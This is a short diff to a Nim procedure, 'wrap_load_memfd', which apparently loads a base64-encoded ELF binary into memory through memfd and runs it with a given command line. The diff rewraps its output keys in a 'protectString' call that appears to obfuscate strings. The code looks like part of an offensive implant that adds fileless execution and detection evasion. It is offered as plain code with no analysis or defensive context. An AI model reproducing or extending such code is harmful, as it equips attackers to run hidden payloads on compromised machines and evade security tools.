@@ -117,9 +117,9 @@ proc wrap_load_memfd(elf_base64: string, command_line: string, mode: string): bo
     (is_success, output) = load_memfd(elf_base64, command_line, is_task)
 
     var data = {
-        "is_success": $is_success,
-        "mode": mode,
-        "command_line": command_line
+        protectString("mode"): mode,
+        protectString("command_line"): command_line,
+        protectString("is_success"): $is_success
     }.toOrderedTable()
     
     if output.len() > 0:
